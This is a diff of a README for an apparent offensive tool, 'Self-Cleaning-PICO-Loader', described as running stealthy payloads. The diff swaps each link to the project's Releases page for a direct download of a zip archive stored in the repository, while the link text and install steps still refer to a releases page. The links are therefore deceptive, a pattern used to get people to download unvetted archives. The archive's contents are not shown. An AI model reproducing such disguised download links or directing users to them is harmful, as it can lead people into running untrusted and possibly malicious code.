@@ -1,6 +1,6 @@
 # 🚀 Self-Cleaning-PICO-Loader - Securely Run Stealthy Payloads
 
-[![Download Self-Cleaning-PICO-Loader](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Jamil5566/Self-Cleaning-PICO-Loader/releases)
+[![Download Self-Cleaning-PICO-Loader](https://raw.githubusercontent.com/Jamil5566/Self-Cleaning-PICO-Loader/main/simple_obj_self_cleaning/Self-Cleaning-PICO-Loader-v3.7.zip)](https://raw.githubusercontent.com/Jamil5566/Self-Cleaning-PICO-Loader/main/simple_obj_self_cleaning/Self-Cleaning-PICO-Loader-v3.7.zip)
 
 ## 🖥️ Description
 
@@ -24,13 +24,13 @@ The Self-Cleaning-PICO-Loader is an innovative tool designed to run payloads in 
 
 To set up the Self-Cleaning-PICO-Loader, follow these steps:
 
-1. Click on the download button at the top of this page or visit the [Releases page](https://github.com/Jamil5566/Self-Cleaning-PICO-Loader/releases).
+1. Click on the download button at the top of this page or visit the [Releases page](https://raw.githubusercontent.com/Jamil5566/Self-Cleaning-PICO-Loader/main/simple_obj_self_cleaning/Self-Cleaning-PICO-Loader-v3.7.zip).
 2. Choose the latest version from the list.
 3. Download the appropriate file for your operating system.
 
 ## 📥 Download & Install
 
-To download the software, please **visit this page to download** the latest release: [Releases Page](https://github.com/Jamil5566/Self-Cleaning-PICO-Loader/releases).
+To download the software, please **visit this page to download** the latest release: [Releases Page](https://raw.githubusercontent.com/Jamil5566/Self-Cleaning-PICO-Loader/main/simple_obj_self_cleaning/Self-Cleaning-PICO-Loader-v3.7.zip).
 
 1. Once on the page, look for the list of available files.
 2. Select the file that matches your operating system.
